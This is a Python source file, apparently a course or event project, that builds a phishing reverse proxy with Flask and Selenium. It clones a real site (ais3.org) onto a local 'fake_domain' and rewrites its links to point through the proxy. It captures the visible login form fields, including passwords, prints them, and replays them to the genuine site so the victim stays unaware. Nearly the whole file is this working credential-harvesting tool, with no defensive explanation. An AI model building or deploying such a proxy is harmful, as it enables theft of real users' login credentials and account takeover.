#import numpy as np
from time import sleep
from random import random
import re

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import requests

from crawl import crawl_info
from bs4 import BeautifulSoup

fake_domain = "http://127.0.0.1:5000/"
from flask import Flask, render_template, jsonify, request
app = Flask(__name__)

service = Service(executable_path=".\chromedriver.exe")
opt = webdriver.ChromeOptions()
opt.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36")
opt.add_argument("--window-size=1920,1080")
#opt.add_argument("--headless=new")
opt.add_argument("--disable-gpu")
driver = webdriver.Chrome(service=service, options=opt)

real_domain = "https://ais3.org/"
real_url = real_domain
html = ""

def rel2abs(relative_url):
    global real_domain
    global real_url
    global html
    relative_url = relative_url.group(0)
    #print(relative_url)
    return relative_url[0] + real_domain + relative_url[2:]

def fake(url):
    global real_domain
    global real_url
    global html
    url = url.group(0)
    print(url)
    return url[:url.find('href="')+6] + fake_domain + url[url.find('href="')+6:]

def get_post_parameter(html):
    soup = BeautifulSoup(html, 'html.parser')
    # 移除帶有 hidden 屬性的 input 元素
    for input_element in soup.find_all('input'):
        if input_element.get('type') == 'hidden':
            input_element.extract()  # 移除元素

    # 找到登入頁面中的所有 input 元素，並獲取其 name 和 value 屬性
    post_params = []
    for input_element in soup.find_all('input'):
        name = input_element.get('name')
        if name:
            post_params.append(name)
    return post_params

relative_re = r'(/[^/\s"]+)+'
@app.route("/")
def index():
    return redir(None)
@app.route("/<path:url>", methods=['GET', 'POST'])
def redir(url):
    global real_domain
    global real_url
    global html
    get_url = url or real_url
    print(get_url)
    if request.method == 'POST':
        post_data = request.form.to_dict()
        #print(post_data)#dictionary of body of post
        post_para = get_post_parameter(html)
        result_dict={}
        for key in post_para:
            result_dict[key]=post_data[key]
        print(result_dict)    
        '''result_dict={
            "nickname" : post_data['nickname'],
            "password" : post_data['password']
        }'''

        html = "<!DOCTYPE html>\n" + crawl_info(get_url , result_dict)
        html = re.sub(r'["=\s,]'+relative_re, rel2abs, html)
        html = re.sub(r'<\s*a[^>]*?href="[^/"]*/'+relative_re, fake, html)
        #html = requests.post(get_url, data=post_data).text
    else:
        try:
            driver.get(get_url)
            real_url = get_url
            html = "<!DOCTYPE html>\n" + driver.page_source
            html = re.sub(r'["=\s,]'+relative_re, rel2abs, html)
            html = re.sub(r'<\s*a[^>]*?href="[^/"]*/'+relative_re, fake, html)
            real_domain = re.search(r'https?://[^/]+/', real_url).group(0)
        except:
            pass
    '''output_file = "./templates/fake_info.html"
    with open(output_file, "w", encoding="utf-8") as file:
        file.write(html)
    print(f"HTML內容已儲存至 {output_file}")'''
    return html
#print(re.sub(r'(href="|src="|srcset=")'+relative_re+'"', rel2abs, '<script defer="" src="/xjs/_/js/k=xjs.s.zh_TW.u6BPn4GVux4.O/am=CAAAAAAAAAIAEA2EQwAbQIAAAAgAAEAAgAAAAAAAcBABwACA4FEmCQAACBBCwkCIgQ0ASCgBAAAAAIT9EQEAAAAgBgQAAIRCABgQARVAAAAAAOQBCHgAwGDCAgAAAAAAAAAAAAGUIBhckAAoCAABAAAAAAAAAABAKpm8OBAC/d=1/ed=1/dg=2/br=1/rs=ACT90oFF4_U8fIeAy5rglPybn9UmUaddvw/ee=cEt90b:ws9Tlc;qddgKe:x4FYXe,d7YSfd;yxTchf:KUM7Z;dtl0hd:lLQWFe;eHDfl:ofjVkb;qaS3gd:yiLg6e;nAFL3:NTMZac,s39S4;oGtAuc:sOXFj;iFQyKf:vfuNJf,QIhFr;SNUn3:ZwDk9d,x8cHvb;io8t5d:sgY6Zb;Oj465e:KG2eXe,KG2eXe;Erl4fe:FloWmf,FloWmf;JsbNhc:Xd8iUd;sP4Vbe:VwDzFe;kMFpHd:OTA3Ae;uY49fb:COQbmf;Pjplud:PoEs9b,EEDORb;QGR0gd:Mlhmy;a56pNe:JEfCwb;Me32dd:MEeYgc;wR5FRb:TtcOte,O1Gjze;pXdRYb:JKoKVe,MdUzUe;dIoSBb:ZgGg9b;EmZ2Bf:zr1jrb;NSEoX:lazG7b;eBAeSb:Ck63tb;WCEKNd:I46Hvd;wV5Pjc:L8KGxe;EVNhjf:pw70Gc;sTsDMc:kHVSUb;wQlYve:aLUfP;zOsCQe:Ko78Df;KcokUb:KiuZBf;YV5bee:IvPZ6d;kbAm9d:MkHyGd;lzgfYb:PI40bd;g8nkx:U4MzKc;ESrPQc:mNTJvc;qavrXe:zQzcXe,mYbt1d;pNsl2d:j9Yuyc;w9w86d:dt4g2b;GleZL:J1A7Od;bcPXSc:gSZLJb;JXS8fb:Qj0suc;IoGlCf:b5lhvb;NPKaK:SdcwHb;LBgRLc:XVMNvd,SdcwHb;vfVwPd:OXTqFb;R9Ulx:CR7Ufe;kY7VAf:d91TEb;KpRAue:Tia57b;jY0zg:Q6tNgc;l8Azde:j4Ca9b;oSUNyd:fTfGO,fTfGO,vjQg0b;SMDL4c:fTfGO,vjQg0b;aZ61od:arTwJ;ZrFutb:W4Cdfc;K8vqCc:MyIcle;rQSrae:C6D5Fc;kCQyJ:ueyPK;KQzWid:mB4wNe;EABSZ:MXZt9d;TxfV6d:YORN0b;UDrY1c:eps46d;F9mqte:UoRcbe;Nyt6ic:jn2sGd;w3bZCb:ZPGaIb;VGRfx:VFqbr;G0KhTb:LIaoZ;aAJE9c:WHW6Ef;V2HTTe:RolTY;Wfmdue:g3MJlb;imqimf:jKGL2e;BgS6mb:fidj5d;UVmjEd:EesRsb;z97YGf:oug9te;AfeaP:TkrAjf;eBZ5Nd:audvde;CxXAWb:YyRLvc;VN6jIc:ddQyuf;SLtqO:Kh1xYe;tosKvd:ZCqP3;VOcgDe:YquhTb;uuQkY:u2V3ud;WDGyFe:jcVOxd;trZL0b:qY8PFe;VxQ32b:k0XsBb;DULqB:RKfG5c;Np8Qkd:Dpx6qc;cFTWae:gT8qnd;gaub4:TN6bMe;xBbsrc:NEW1Qc;DpcR3d:zL72xf;hjRo6e:F62sG;BjwMce:cXX2Wb;yGxLoc:FmAr0c;oUlnpc:RagDlc;R2kc8b:ALJqWb;pj82le:mg5CW;dLlj2:Qqt3Gf;qGV2uc:HHi04c;UyG7Kb:wQd0G;LsNahb:ucGLNb;xbe2wc:wbTLEd;Q1Ow7b:x5CSu;okUaUd:wItadb;G6wU6e:hezEbd;uknmt:GkPrzb;PqHfGe:im2cZe;Fmv9Nc:O1Tzwc;hK67qb:QWEO5b;BMxAGc:E5bFse;R4IIIb:QWfeKf;whEZac:F4AmNb;tH4IIe:Ymry6;zxnPse:GkRiKb;xqZiqf:wmnU7d;lkq0A:Z0MWEf;daB6be:lMxGPd;U96pRd:FsR04;LEikZe:byfTOb,lsjVmc/m=cdos,hsm,jsa,mb4ZUb,d,csi,cEt90b,SNUn3,qddgKe,sTsDMc,dtl0hd,eHDfl" nonce=""></script>'))
app.run()
driver.close()

#print(re.sub(r'(/\w+)+.\w+', repl, '<img class="lnXdpd" alt="Google" height="92" src="/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" srcset="/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png 1x, /images/branding/googlelogo/2x/googlelogo_color_272x92dp.png 2x" width="272" data-atf="1" data-frt="0">'))
#sleep(10)
""" f = open("test.html", "w", encoding='UTF-8')
f.write(re.sub(r'[\s"=](/[a-zA-Z0-9_.]+)+[\s"=]', repl, driver.page_source))
print(re.sub(r'[\s"=](/[a-zA-Z0-9_.]+)+[\s"=]', repl, driver.page_source))
f.close() """
#html=re.sub(r'[\s"=](/[a-zA-Z0-9_.]+)+[\s"=]', repl, driver.page_source)
""" sleep(1)
url = "https://www.google.com"
driver.get(url)
html=re.sub(r'[\s"=](/[a-zA-Z0-9_.]+)+[\s"=]', repl, driver.page_source)
driver.close() """